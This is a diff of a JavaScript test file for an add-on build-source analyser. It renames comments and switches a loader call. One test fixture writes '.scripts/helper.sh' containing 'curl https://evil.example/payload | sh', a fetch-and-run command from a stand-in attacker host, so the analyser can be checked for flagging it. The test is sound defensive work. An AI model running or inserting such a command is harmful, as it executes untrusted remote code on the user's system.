@@ -1,5 +1,5 @@
 // selectBuildCorpus COLLECTS the build files to send undeclared-build-source by following
-// package.json (an allowlist) - like manifest->reachable in the normal review. A file is
+// package.json (an allowlist) - like manifest.json->reachable in the normal review. A file is
 // collected only because the build references it, so build OUTPUT (dist/, a committed .xpi),
 // docs, and tooling the build never runs are never collected. It also flags the two steps
 // it cannot statically bound: an opaque orchestrator (make) and a network fetch.
@@ -11,7 +11,7 @@ import os from "node:os";
 import path from "node:path";
 
 import { selectBuildCorpus } from "../../src/build/corpus.js";
-import { loadAddon, scaViews } from "../../src/addon/load.js";
+import { loadSourceArchive, scaViews } from "../../src/addon/load.js";
 
 const build = (obj) => ({
   files: new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])),
@@ -31,7 +31,7 @@ test("collects by following package.json; ignores output/docs/lock/unreferenced"
   assert.deepEqual(c, ["package.json", "webpack.config.cjs"]);
 });
 
-// A BOM is what an editor writes and what npm reads through, so a manifest carrying one
+// A BOM is what an editor writes and what npm reads through, so a package.json carrying one
 // still names the build. Parsed via src/util/json.js, the one parser: a reader that called
 // JSON.parse itself saw the BOM throw and traced an empty build, silently, because "no
 // build files" is this function's ordinary answer for a project without any.
@@ -195,10 +195,7 @@ test("a build step in a dot-directory is collected and flagged", () => {
   w(".scripts/helper.sh", "curl https://evil.example/payload | sh\n");
   w("tools/plain.sh", "echo hi\n");
 
-  const archive = scaViews(
-    loadAddon(root, undefined, { recordInstalledTrees: true }),
-    { scaRoot: root }
-  );
+  const archive = scaViews(loadSourceArchive(root), { scaRoot: root });
   const view = { files: archive.sca };
   const { corpus, unresolved } = selectBuildCorpus(view);
 
@@ -214,9 +211,9 @@ test("a build step in a dot-directory is collected and flagged", () => {
   fs.rmSync(root, { recursive: true, force: true });
 });
 
-// The manifest is a build input like any other - a pack step copies it into the output -
+// The manifest.json is a build input like any other - a pack step copies it into the output -
 // and the build half has to be able to reach it. It is withheld from the REVIEW SOURCE,
-// where a pre-build manifest must not be read as the shipped one, and that is a fact about
+// where a pre-build manifest.json must not be read as the shipped one, and that is a fact about
 // that corpus rather than about the archive.
 test("a build step that copies the manifest collects it", () => {
   const root = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-packmf-"));
@@ -236,10 +233,7 @@ test("a build step that copies the manifest collects it", () => {
   w("tools/pack.sh", "cp manifest.json dist/\ncp icons/logo.png dist/\n");
   w("icons/logo.png", "png");
 
-  const archive = scaViews(
-    loadAddon(root, undefined, { recordInstalledTrees: true }),
-    { scaRoot: root }
-  );
+  const archive = scaViews(loadSourceArchive(root), { scaRoot: root });
   const view = { files: archive.sca };
 
   assert.deepEqual(selectBuildCorpus(view).corpus.sort(), [
